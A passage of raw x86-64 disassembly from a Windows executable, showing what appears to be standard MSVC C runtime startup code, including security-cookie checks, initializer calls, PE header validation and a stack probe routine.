   140006e2f:	48 8d 05 ba 28 00 00 	lea    0x28ba(%rip),%rax        # 0x1400096f0
   140006e36:	48 89 01             	mov    %rax,(%rcx)
   140006e39:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140006e3d:	48 85 c9             	test   %rcx,%rcx
   140006e40:	74 0d                	je     0x140006e4f
   140006e42:	48 8b 01             	mov    (%rcx),%rax
   140006e45:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006e49:	ff 15 11 28 00 00    	call   *0x2811(%rip)        # 0x140009660
   140006e4f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140006e53:	48 85 c9             	test   %rcx,%rcx
   140006e56:	74 07                	je     0x140006e5f
   140006e58:	ff 15 8a 22 00 00    	call   *0x228a(%rip)        # 0x1400090e8
   140006e5e:	90                   	nop
   140006e5f:	40 f6 c7 01          	test   $0x1,%dil
   140006e63:	74 0d                	je     0x140006e72
   140006e65:	ba 20 00 00 00       	mov    $0x20,%edx
   140006e6a:	48 8b cb             	mov    %rbx,%rcx
   140006e6d:	e8 6e 00 00 00       	call   0x140006ee0
   140006e72:	48 8b c3             	mov    %rbx,%rax
   140006e75:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006e7a:	48 83 c4 20          	add    $0x20,%rsp
   140006e7e:	5f                   	pop    %rdi
   140006e7f:	c3                   	ret
   140006e80:	48 83 ec 48          	sub    $0x48,%rsp
   140006e84:	4c 8b c2             	mov    %rdx,%r8
   140006e87:	45 33 c9             	xor    %r9d,%r9d
   140006e8a:	8b d1                	mov    %ecx,%edx
   140006e8c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006e91:	e8 ea fe ff ff       	call   0x140006d80
   140006e96:	48 8d 15 53 4a 00 00 	lea    0x4a53(%rip),%rdx        # 0x14000b8f0
   140006e9d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006ea2:	e8 75 0f 00 00       	call   0x140007e1c
   140006ea7:	cc                   	int3
   140006ea8:	cc                   	int3
   140006ea9:	cc                   	int3
   140006eaa:	cc                   	int3
   140006eab:	cc                   	int3
   140006eac:	cc                   	int3
   140006ead:	cc                   	int3
   140006eae:	cc                   	int3
   140006eaf:	cc                   	int3
   140006eb0:	cc                   	int3
   140006eb1:	cc                   	int3
   140006eb2:	cc                   	int3
   140006eb3:	cc                   	int3
   140006eb4:	cc                   	int3
   140006eb5:	cc                   	int3
   140006eb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140006ebd:	00 00 00 
   140006ec0:	48 3b 0d 79 71 00 00 	cmp    0x7179(%rip),%rcx        # 0x14000e040
   140006ec7:	75 10                	jne    0x140006ed9
   140006ec9:	48 c1 c1 10          	rol    $0x10,%rcx
   140006ecd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140006ed2:	75 01                	jne    0x140006ed5
   140006ed4:	c3                   	ret
   140006ed5:	48 c1 c9 10          	ror    $0x10,%rcx
   140006ed9:	e9 86 06 00 00       	jmp    0x140007564
   140006ede:	cc                   	int3
   140006edf:	cc                   	int3
   140006ee0:	e9 c7 07 00 00       	jmp    0x1400076ac
   140006ee5:	cc                   	int3
   140006ee6:	cc                   	int3
   140006ee7:	cc                   	int3
   140006ee8:	40 53                	rex push %rbx
   140006eea:	48 83 ec 20          	sub    $0x20,%rsp
   140006eee:	48 8b d9             	mov    %rcx,%rbx
   140006ef1:	eb 0f                	jmp    0x140006f02
   140006ef3:	48 8b cb             	mov    %rbx,%rcx
   140006ef6:	e8 51 0f 00 00       	call   0x140007e4c
   140006efb:	85 c0                	test   %eax,%eax
   140006efd:	74 13                	je     0x140006f12
   140006eff:	48 8b cb             	mov    %rbx,%rcx
   140006f02:	e8 3f 0f 00 00       	call   0x140007e46
   140006f07:	48 85 c0             	test   %rax,%rax
   140006f0a:	74 e7                	je     0x140006ef3
   140006f0c:	48 83 c4 20          	add    $0x20,%rsp
   140006f10:	5b                   	pop    %rbx
   140006f11:	c3                   	ret
   140006f12:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006f16:	74 06                	je     0x140006f1e
   140006f18:	e8 bb 07 00 00       	call   0x1400076d8
   140006f1d:	cc                   	int3
   140006f1e:	e8 6d a3 ff ff       	call   0x140001290
   140006f23:	cc                   	int3
   140006f24:	48 8b c4             	mov    %rsp,%rax
   140006f27:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140006f2b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140006f2f:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140006f33:	53                   	push   %rbx
   140006f34:	56                   	push   %rsi
   140006f35:	57                   	push   %rdi
   140006f36:	41 56                	push   %r14
   140006f38:	48 83 ec 38          	sub    $0x38,%rsp
   140006f3c:	4d 8b f1             	mov    %r9,%r14
   140006f3f:	49 8b d8             	mov    %r8,%rbx
   140006f42:	48 8b f2             	mov    %rdx,%rsi
   140006f45:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   140006f49:	48 8b fa             	mov    %rdx,%rdi
   140006f4c:	49 0f af f8          	imul   %r8,%rdi
   140006f50:	48 03 f9             	add    %rcx,%rdi
   140006f53:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140006f57:	48 8b c3             	mov    %rbx,%rax
   140006f5a:	48 ff cb             	dec    %rbx
   140006f5d:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140006f62:	48 85 c0             	test   %rax,%rax
   140006f65:	74 19                	je     0x140006f80
   140006f67:	48 2b fe             	sub    %rsi,%rdi
   140006f6a:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140006f6f:	48 8b cf             	mov    %rdi,%rcx
   140006f72:	49 8b c6             	mov    %r14,%rax
   140006f75:	48 8b 15 e4 26 00 00 	mov    0x26e4(%rip),%rdx        # 0x140009660
   140006f7c:	ff d2                	call   *%rdx
   140006f7e:	eb d7                	jmp    0x140006f57
   140006f80:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   140006f85:	48 83 c4 38          	add    $0x38,%rsp
   140006f89:	41 5e                	pop    %r14
   140006f8b:	5f                   	pop    %rdi
   140006f8c:	5e                   	pop    %rsi
   140006f8d:	5b                   	pop    %rbx
   140006f8e:	c3                   	ret
   140006f8f:	cc                   	int3
   140006f90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006f95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006f9a:	57                   	push   %rdi
   140006f9b:	41 56                	push   %r14
   140006f9d:	41 57                	push   %r15
   140006f9f:	48 83 ec 40          	sub    $0x40,%rsp
   140006fa3:	4d 8b f1             	mov    %r9,%r14
   140006fa6:	49 8b f0             	mov    %r8,%rsi
   140006fa9:	4c 8b fa             	mov    %rdx,%r15
   140006fac:	48 8b f9             	mov    %rcx,%rdi
   140006faf:	33 db                	xor    %ebx,%ebx
   140006fb1:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006fb6:	48 3b de             	cmp    %rsi,%rbx
   140006fb9:	74 19                	je     0x140006fd4
   140006fbb:	49 2b ff             	sub    %r15,%rdi
   140006fbe:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140006fc3:	48 8b cf             	mov    %rdi,%rcx
   140006fc6:	49 8b c6             	mov    %r14,%rax
   140006fc9:	ff 15 91 26 00 00    	call   *0x2691(%rip)        # 0x140009660
   140006fcf:	48 ff c3             	inc    %rbx
   140006fd2:	eb dd                	jmp    0x140006fb1
   140006fd4:	eb 00                	jmp    0x140006fd6
   140006fd6:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140006fdb:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006fe0:	48 83 c4 40          	add    $0x40,%rsp
   140006fe4:	41 5f                	pop    %r15
   140006fe6:	41 5e                	pop    %r14
   140006fe8:	5f                   	pop    %rdi
   140006fe9:	c3                   	ret
   140006fea:	cc                   	int3
   140006feb:	cc                   	int3
   140006fec:	40 53                	rex push %rbx
   140006fee:	48 83 ec 20          	sub    $0x20,%rsp
   140006ff2:	48 8d 05 37 27 00 00 	lea    0x2737(%rip),%rax        # 0x140009730
   140006ff9:	48 8b d9             	mov    %rcx,%rbx
   140006ffc:	48 89 01             	mov    %rax,(%rcx)
   140006fff:	f6 c2 01             	test   $0x1,%dl
   140007002:	74 0a                	je     0x14000700e
   140007004:	ba 18 00 00 00       	mov    $0x18,%edx
   140007009:	e8 d2 fe ff ff       	call   0x140006ee0
   14000700e:	48 8b c3             	mov    %rbx,%rax
   140007011:	48 83 c4 20          	add    $0x20,%rsp
   140007015:	5b                   	pop    %rbx
   140007016:	c3                   	ret
   140007017:	cc                   	int3
   140007018:	40 53                	rex push %rbx
   14000701a:	48 83 ec 20          	sub    $0x20,%rsp
   14000701e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007023:	e8 30 0e 00 00       	call   0x140007e58
   140007028:	e8 87 07 00 00       	call   0x1400077b4
   14000702d:	8b c8                	mov    %eax,%ecx
   14000702f:	e8 5a 0e 00 00       	call   0x140007e8e
   140007034:	e8 6f 07 00 00       	call   0x1400077a8
   140007039:	8b d8                	mov    %eax,%ebx
   14000703b:	e8 72 0e 00 00       	call   0x140007eb2
   140007040:	b9 01 00 00 00       	mov    $0x1,%ecx
   140007045:	89 18                	mov    %ebx,(%rax)
   140007047:	e8 b0 02 00 00       	call   0x1400072fc
   14000704c:	84 c0                	test   %al,%al
   14000704e:	74 73                	je     0x1400070c3
   140007050:	e8 1f 0a 00 00       	call   0x140007a74
   140007055:	48 8d 0d 54 0a 00 00 	lea    0xa54(%rip),%rcx        # 0x140007ab0
   14000705c:	e8 4b 04 00 00       	call   0x1400074ac
   140007061:	e8 46 07 00 00       	call   0x1400077ac
   140007066:	8b c8                	mov    %eax,%ecx
   140007068:	e8 f7 0d 00 00       	call   0x140007e64
   14000706d:	85 c0                	test   %eax,%eax
   14000706f:	75 52                	jne    0x1400070c3
   140007071:	e8 46 07 00 00       	call   0x1400077bc
   140007076:	e8 79 07 00 00       	call   0x1400077f4
   14000707b:	85 c0                	test   %eax,%eax
   14000707d:	74 0c                	je     0x14000708b
   14000707f:	48 8d 0d 22 07 00 00 	lea    0x722(%rip),%rcx        # 0x1400077a8
   140007086:	e8 d3 0d 00 00       	call   0x140007e5e
   14000708b:	e8 34 04 00 00       	call   0x1400074c4
   140007090:	e8 2f 04 00 00       	call   0x1400074c4
   140007095:	e8 0e 07 00 00       	call   0x1400077a8
   14000709a:	8b c8                	mov    %eax,%ecx
   14000709c:	e8 05 0e 00 00       	call   0x140007ea6
   1400070a1:	e8 26 07 00 00       	call   0x1400077cc
   1400070a6:	84 c0                	test   %al,%al
   1400070a8:	74 05                	je     0x1400070af
   1400070aa:	e8 bb 0d 00 00       	call   0x140007e6a
   1400070af:	e8 f4 06 00 00       	call   0x1400077a8
   1400070b4:	e8 eb 08 00 00       	call   0x1400079a4
   1400070b9:	85 c0                	test   %eax,%eax
   1400070bb:	75 06                	jne    0x1400070c3
   1400070bd:	48 83 c4 20          	add    $0x20,%rsp
   1400070c1:	5b                   	pop    %rbx
   1400070c2:	c3                   	ret
   1400070c3:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400070c8:	e8 4f 07 00 00       	call   0x14000781c
   1400070cd:	cc                   	int3
   1400070ce:	cc                   	int3
   1400070cf:	cc                   	int3
   1400070d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400070d4:	e8 ff 06 00 00       	call   0x1400077d8
   1400070d9:	33 c0                	xor    %eax,%eax
   1400070db:	48 83 c4 28          	add    $0x28,%rsp
   1400070df:	c3                   	ret
   1400070e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400070e4:	e8 17 09 00 00       	call   0x140007a00
   1400070e9:	e8 ba 06 00 00       	call   0x1400077a8
   1400070ee:	8b c8                	mov    %eax,%ecx
   1400070f0:	48 83 c4 28          	add    $0x28,%rsp
   1400070f4:	e9 b3 0d 00 00       	jmp    0x140007eac
   1400070f9:	cc                   	int3
   1400070fa:	cc                   	int3
   1400070fb:	cc                   	int3
   1400070fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007101:	57                   	push   %rdi
   140007102:	48 83 ec 30          	sub    $0x30,%rsp
   140007106:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000710b:	e8 b0 01 00 00       	call   0x1400072c0
   140007110:	84 c0                	test   %al,%al
   140007112:	0f 84 30 01 00 00    	je     0x140007248
   140007118:	40 32 ff             	xor    %dil,%dil
   14000711b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140007120:	e8 5f 01 00 00       	call   0x140007284
   140007125:	8a d8                	mov    %al,%bl
   140007127:	8b 0d 63 72 00 00    	mov    0x7263(%rip),%ecx        # 0x14000e390
   14000712d:	83 f9 01             	cmp    $0x1,%ecx
   140007130:	0f 84 1d 01 00 00    	je     0x140007253
   140007136:	85 c9                	test   %ecx,%ecx
   140007138:	75 4a                	jne    0x140007184
   14000713a:	c7 05 4c 72 00 00 01 	movl   $0x1,0x724c(%rip)        # 0x14000e390
   140007141:	00 00 00 
   140007144:	48 8d 15 75 25 00 00 	lea    0x2575(%rip),%rdx        # 0x1400096c0
   14000714b:	48 8d 0d 56 25 00 00 	lea    0x2556(%rip),%rcx        # 0x1400096a8
   140007152:	e8 25 0d 00 00       	call   0x140007e7c
   140007157:	85 c0                	test   %eax,%eax
   140007159:	74 0a                	je     0x140007165
   14000715b:	b8 ff 00 00 00       	mov    $0xff,%eax
   140007160:	e9 d8 00 00 00       	jmp    0x14000723d
   140007165:	48 8d 15 34 25 00 00 	lea    0x2534(%rip),%rdx        # 0x1400096a0
   14000716c:	48 8d 0d 15 25 00 00 	lea    0x2515(%rip),%rcx        # 0x140009688
   140007173:	e8 fe 0c 00 00       	call   0x140007e76
   140007178:	c7 05 0e 72 00 00 02 	movl   $0x2,0x720e(%rip)        # 0x14000e390
   14000717f:	00 00 00 
   140007182:	eb 08                	jmp    0x14000718c
   140007184:	40 b7 01             	mov    $0x1,%dil
   140007187:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   14000718c:	8a cb                	mov    %bl,%cl
   14000718e:	e8 8d 02 00 00       	call   0x140007420
   140007193:	e8 68 06 00 00       	call   0x140007800
   140007198:	48 8b d8             	mov    %rax,%rbx
   14000719b:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000719f:	74 1e                	je     0x1400071bf
   1400071a1:	48 8b c8             	mov    %rax,%rcx
   1400071a4:	e8 df 01 00 00       	call   0x140007388
   1400071a9:	84 c0                	test   %al,%al
   1400071ab:	74 12                	je     0x1400071bf
   1400071ad:	45 33 c0             	xor    %r8d,%r8d
   1400071b0:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400071b4:	33 c9                	xor    %ecx,%ecx
   1400071b6:	48 8b 03             	mov    (%rbx),%rax
   1400071b9:	ff 15 a1 24 00 00    	call   *0x24a1(%rip)        # 0x140009660
   1400071bf:	e8 44 06 00 00       	call   0x140007808
   1400071c4:	48 8b d8             	mov    %rax,%rbx
   1400071c7:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400071cb:	74 14                	je     0x1400071e1
   1400071cd:	48 8b c8             	mov    %rax,%rcx
   1400071d0:	e8 b3 01 00 00       	call   0x140007388
   1400071d5:	84 c0                	test   %al,%al
   1400071d7:	74 08                	je     0x1400071e1
   1400071d9:	48 8b 0b             	mov    (%rbx),%rcx
   1400071dc:	e8 bf 0c 00 00       	call   0x140007ea0
   1400071e1:	e8 82 07 00 00       	call   0x140007968
   1400071e6:	0f b7 d8             	movzwl %ax,%ebx
   1400071e9:	e8 82 0c 00 00       	call   0x140007e70
   1400071ee:	44 8b cb             	mov    %ebx,%r9d
   1400071f1:	4c 8b c0             	mov    %rax,%r8
   1400071f4:	33 d2                	xor    %edx,%edx
   1400071f6:	48 8d 0d 03 8e ff ff 	lea    -0x71fd(%rip),%rcx        # 0x140000000
   1400071fd:	e8 9e ca ff ff       	call   0x140003ca0
   140007202:	8b d8                	mov    %eax,%ebx
   140007204:	e8 a3 07 00 00       	call   0x1400079ac
   140007209:	84 c0                	test   %al,%al
   14000720b:	74 50                	je     0x14000725d
   14000720d:	40 84 ff             	test   %dil,%dil
   140007210:	75 05                	jne    0x140007217
   140007212:	e8 7d 0c 00 00       	call   0x140007e94
   140007217:	33 d2                	xor    %edx,%edx
   140007219:	b1 01                	mov    $0x1,%cl
   14000721b:	e8 24 02 00 00       	call   0x140007444
   140007220:	8b c3                	mov    %ebx,%eax
   140007222:	eb 19                	jmp    0x14000723d
   140007224:	8b d8                	mov    %eax,%ebx
   140007226:	e8 81 07 00 00       	call   0x1400079ac
   14000722b:	84 c0                	test   %al,%al
   14000722d:	74 36                	je     0x140007265
   14000722f:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140007234:	75 05                	jne    0x14000723b
   140007236:	e8 5f 0c 00 00       	call   0x140007e9a
   14000723b:	8b c3                	mov    %ebx,%eax
   14000723d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140007242:	48 83 c4 30          	add    $0x30,%rsp
   140007246:	5f                   	pop    %rdi
   140007247:	c3                   	ret
   140007248:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000724d:	e8 ca 05 00 00       	call   0x14000781c
   140007252:	90                   	nop
   140007253:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007258:	e8 bf 05 00 00       	call   0x14000781c
   14000725d:	8b cb                	mov    %ebx,%ecx
   14000725f:	e8 1e 0c 00 00       	call   0x140007e82
   140007264:	90                   	nop
   140007265:	8b cb                	mov    %ebx,%ecx
   140007267:	e8 1c 0c 00 00       	call   0x140007e88
   14000726c:	90                   	nop
   14000726d:	cc                   	int3
   14000726e:	cc                   	int3
   14000726f:	cc                   	int3
   140007270:	48 83 ec 28          	sub    $0x28,%rsp
   140007274:	e8 7f 04 00 00       	call   0x1400076f8
   140007279:	48 83 c4 28          	add    $0x28,%rsp
   14000727d:	e9 7a fe ff ff       	jmp    0x1400070fc
   140007282:	cc                   	int3
   140007283:	cc                   	int3
   140007284:	48 83 ec 28          	sub    $0x28,%rsp
   140007288:	e8 f7 0a 00 00       	call   0x140007d84
   14000728d:	85 c0                	test   %eax,%eax
   14000728f:	74 21                	je     0x1400072b2
   140007291:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140007298:	00 00 
   14000729a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   14000729e:	eb 05                	jmp    0x1400072a5
   1400072a0:	48 3b c8             	cmp    %rax,%rcx
   1400072a3:	74 14                	je     0x1400072b9
   1400072a5:	33 c0                	xor    %eax,%eax
   1400072a7:	f0 48 0f b1 0d e8 70 	lock cmpxchg %rcx,0x70e8(%rip)        # 0x14000e398
   1400072ae:	00 00 
   1400072b0:	75 ee                	jne    0x1400072a0
   1400072b2:	32 c0                	xor    %al,%al
   1400072b4:	48 83 c4 28          	add    $0x28,%rsp
   1400072b8:	c3                   	ret
   1400072b9:	b0 01                	mov    $0x1,%al
   1400072bb:	eb f7                	jmp    0x1400072b4
   1400072bd:	cc                   	int3
   1400072be:	cc                   	int3
   1400072bf:	cc                   	int3
   1400072c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400072c4:	85 c9                	test   %ecx,%ecx
   1400072c6:	75 07                	jne    0x1400072cf
   1400072c8:	c6 05 d1 70 00 00 01 	movb   $0x1,0x70d1(%rip)        # 0x14000e3a0
   1400072cf:	e8 18 08 00 00       	call   0x140007aec
   1400072d4:	e8 f3 04 00 00       	call   0x1400077cc
   1400072d9:	84 c0                	test   %al,%al
   1400072db:	75 04                	jne    0x1400072e1
   1400072dd:	32 c0                	xor    %al,%al
   1400072df:	eb 14                	jmp    0x1400072f5
   1400072e1:	e8 e6 04 00 00       	call   0x1400077cc
   1400072e6:	84 c0                	test   %al,%al
   1400072e8:	75 09                	jne    0x1400072f3
   1400072ea:	33 c9                	xor    %ecx,%ecx
   1400072ec:	e8 db 04 00 00       	call   0x1400077cc
   1400072f1:	eb ea                	jmp    0x1400072dd
   1400072f3:	b0 01                	mov    $0x1,%al
   1400072f5:	48 83 c4 28          	add    $0x28,%rsp
   1400072f9:	c3                   	ret
   1400072fa:	cc                   	int3
   1400072fb:	cc                   	int3
   1400072fc:	40 53                	rex push %rbx
   1400072fe:	48 83 ec 20          	sub    $0x20,%rsp
   140007302:	80 3d 98 70 00 00 00 	cmpb   $0x0,0x7098(%rip)        # 0x14000e3a1
   140007309:	8b d9                	mov    %ecx,%ebx
   14000730b:	75 67                	jne    0x140007374
   14000730d:	83 f9 01             	cmp    $0x1,%ecx
   140007310:	77 6a                	ja     0x14000737c
   140007312:	e8 6d 0a 00 00       	call   0x140007d84
   140007317:	85 c0                	test   %eax,%eax
   140007319:	74 28                	je     0x140007343
   14000731b:	85 db                	test   %ebx,%ebx
   14000731d:	75 24                	jne    0x140007343
   14000731f:	48 8d 0d 82 70 00 00 	lea    0x7082(%rip),%rcx        # 0x14000e3a8
   140007326:	e8 8d 0b 00 00       	call   0x140007eb8
   14000732b:	85 c0                	test   %eax,%eax
   14000732d:	75 10                	jne    0x14000733f
   14000732f:	48 8d 0d 8a 70 00 00 	lea    0x708a(%rip),%rcx        # 0x14000e3c0
   140007336:	e8 7d 0b 00 00       	call   0x140007eb8
   14000733b:	85 c0                	test   %eax,%eax
   14000733d:	74 2e                	je     0x14000736d
   14000733f:	32 c0                	xor    %al,%al
   140007341:	eb 33                	jmp    0x140007376
   140007343:	66 0f 6f 05 f5 23 00 	movdqa 0x23f5(%rip),%xmm0        # 0x140009740
   14000734a:	00 
   14000734b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000734f:	f3 0f 7f 05 51 70 00 	movdqu %xmm0,0x7051(%rip)        # 0x14000e3a8
   140007356:	00 
   140007357:	48 89 05 5a 70 00 00 	mov    %rax,0x705a(%rip)        # 0x14000e3b8
   14000735e:	f3 0f 7f 05 5a 70 00 	movdqu %xmm0,0x705a(%rip)        # 0x14000e3c0
   140007365:	00 
   140007366:	48 89 05 63 70 00 00 	mov    %rax,0x7063(%rip)        # 0x14000e3d0
   14000736d:	c6 05 2d 70 00 00 01 	movb   $0x1,0x702d(%rip)        # 0x14000e3a1
   140007374:	b0 01                	mov    $0x1,%al
   140007376:	48 83 c4 20          	add    $0x20,%rsp
   14000737a:	5b                   	pop    %rbx
   14000737b:	c3                   	ret
   14000737c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140007381:	e8 96 04 00 00       	call   0x14000781c
   140007386:	cc                   	int3
   140007387:	cc                   	int3
   140007388:	48 83 ec 18          	sub    $0x18,%rsp
   14000738c:	4c 8b c1             	mov    %rcx,%r8
   14000738f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140007394:	66 39 05 65 8c ff ff 	cmp    %ax,-0x739b(%rip)        # 0x140000000
   14000739b:	75 78                	jne    0x140007415
   14000739d:	48 63 0d 98 8c ff ff 	movslq -0x7368(%rip),%rcx        # 0x14000003c
   1400073a4:	48 8d 15 55 8c ff ff 	lea    -0x73ab(%rip),%rdx        # 0x140000000
   1400073ab:	48 03 ca             	add    %rdx,%rcx
   1400073ae:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400073b4:	75 5f                	jne    0x140007415
   1400073b6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400073bb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400073bf:	75 54                	jne    0x140007415
   1400073c1:	4c 2b c2             	sub    %rdx,%r8
   1400073c4:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400073c8:	48 83 c2 18          	add    $0x18,%rdx
   1400073cc:	48 03 d1             	add    %rcx,%rdx
   1400073cf:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400073d3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400073d7:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400073db:	48 89 14 24          	mov    %rdx,(%rsp)
   1400073df:	49 3b d1             	cmp    %r9,%rdx
   1400073e2:	74 18                	je     0x1400073fc
   1400073e4:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400073e7:	4c 3b c1             	cmp    %rcx,%r8
   1400073ea:	72 0a                	jb     0x1400073f6
   1400073ec:	8b 42 08             	mov    0x8(%rdx),%eax
   1400073ef:	03 c1                	add    %ecx,%eax
   1400073f1:	4c 3b c0             	cmp    %rax,%r8
   1400073f4:	72 08                	jb     0x1400073fe
   1400073f6:	48 83 c2 28          	add    $0x28,%rdx
   1400073fa:	eb df                	jmp    0x1400073db
   1400073fc:	33 d2                	xor    %edx,%edx
   1400073fe:	48 85 d2             	test   %rdx,%rdx
   140007401:	75 04                	jne    0x140007407
   140007403:	32 c0                	xor    %al,%al
   140007405:	eb 14                	jmp    0x14000741b
   140007407:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   14000740b:	7d 04                	jge    0x140007411
   14000740d:	32 c0                	xor    %al,%al
   14000740f:	eb 0a                	jmp    0x14000741b
   140007411:	b0 01                	mov    $0x1,%al
   140007413:	eb 06                	jmp    0x14000741b
   140007415:	32 c0                	xor    %al,%al
   140007417:	eb 02                	jmp    0x14000741b
   140007419:	32 c0                	xor    %al,%al
   14000741b:	48 83 c4 18          	add    $0x18,%rsp
   14000741f:	c3                   	ret
   140007420:	40 53                	rex push %rbx
   140007422:	48 83 ec 20          	sub    $0x20,%rsp
   140007426:	8a d9                	mov    %cl,%bl
   140007428:	e8 57 09 00 00       	call   0x140007d84
   14000742d:	33 d2                	xor    %edx,%edx
   14000742f:	85 c0                	test   %eax,%eax
   140007431:	74 0b                	je     0x14000743e
   140007433:	84 db                	test   %bl,%bl
   140007435:	75 07                	jne    0x14000743e
   140007437:	48 87 15 5a 6f 00 00 	xchg   %rdx,0x6f5a(%rip)        # 0x14000e398
   14000743e:	48 83 c4 20          	add    $0x20,%rsp
   140007442:	5b                   	pop    %rbx
   140007443:	c3                   	ret
   140007444:	40 53                	rex push %rbx
   140007446:	48 83 ec 20          	sub    $0x20,%rsp
   14000744a:	80 3d 4f 6f 00 00 00 	cmpb   $0x0,0x6f4f(%rip)        # 0x14000e3a0
   140007451:	8a d9                	mov    %cl,%bl
   140007453:	74 04                	je     0x140007459
   140007455:	84 d2                	test   %dl,%dl
   140007457:	75 0c                	jne    0x140007465
   140007459:	e8 6e 03 00 00       	call   0x1400077cc
   14000745e:	8a cb                	mov    %bl,%cl
   140007460:	e8 67 03 00 00       	call   0x1400077cc
   140007465:	b0 01                	mov    $0x1,%al
   140007467:	48 83 c4 20          	add    $0x20,%rsp
   14000746b:	5b                   	pop    %rbx
   14000746c:	c3                   	ret
   14000746d:	cc                   	int3
   14000746e:	cc                   	int3
   14000746f:	cc                   	int3
   140007470:	40 53                	rex push %rbx
   140007472:	48 83 ec 20          	sub    $0x20,%rsp
   140007476:	48 83 3d 2a 6f 00 00 	cmpq   $0xffffffffffffffff,0x6f2a(%rip)        # 0x14000e3a8
   14000747d:	ff 
   14000747e:	48 8b d9             	mov    %rcx,%rbx
   140007481:	75 07                	jne    0x14000748a
   140007483:	e8 3c 0a 00 00       	call   0x140007ec4
   140007488:	eb 0f                	jmp    0x140007499
   14000748a:	48 8b d3             	mov    %rbx,%rdx
   14000748d:	48 8d 0d 14 6f 00 00 	lea    0x6f14(%rip),%rcx        # 0x14000e3a8
   140007494:	e8 25 0a 00 00       	call   0x140007ebe
   140007499:	33 d2                	xor    %edx,%edx
   14000749b:	85 c0                	test   %eax,%eax
   14000749d:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400074a1:	48 8b c2             	mov    %rdx,%rax
   1400074a4:	48 83 c4 20          	add    $0x20,%rsp
   1400074a8:	5b                   	pop    %rbx
   1400074a9:	c3                   	ret
   1400074aa:	cc                   	int3
   1400074ab:	cc                   	int3
   1400074ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400074b0:	e8 bb ff ff ff       	call   0x140007470
   1400074b5:	48 f7 d8             	neg    %rax
   1400074b8:	1b c0                	sbb    %eax,%eax
   1400074ba:	f7 d8                	neg    %eax
   1400074bc:	ff c8                	dec    %eax
   1400074be:	48 83 c4 28          	add    $0x28,%rsp
   1400074c2:	c3                   	ret
   1400074c3:	cc                   	int3
   1400074c4:	c2 00 00             	ret    $0x0
   1400074c7:	cc                   	int3
   1400074c8:	cc                   	int3
   1400074c9:	cc                   	int3
   1400074ca:	cc                   	int3
   1400074cb:	cc                   	int3
   1400074cc:	cc                   	int3
   1400074cd:	cc                   	int3
   1400074ce:	cc                   	int3
   1400074cf:	cc                   	int3
   1400074d0:	cc                   	int3
   1400074d1:	cc                   	int3
   1400074d2:	cc                   	int3
   1400074d3:	cc                   	int3
   1400074d4:	cc                   	int3
   1400074d5:	cc                   	int3
   1400074d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400074dd:	00 00 00 
   1400074e0:	48 83 ec 10          	sub    $0x10,%rsp
   1400074e4:	4c 89 14 24          	mov    %r10,(%rsp)
   1400074e8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1400074ed:	4d 33 db             	xor    %r11,%r11
   1400074f0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1400074f5:	4c 2b d0             	sub    %rax,%r10
   1400074f8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1400074fc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   140007503:	00 00 
   140007505:	4d 3b d3             	cmp    %r11,%r10
   140007508:	73 16                	jae    0x140007520
   14000750a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
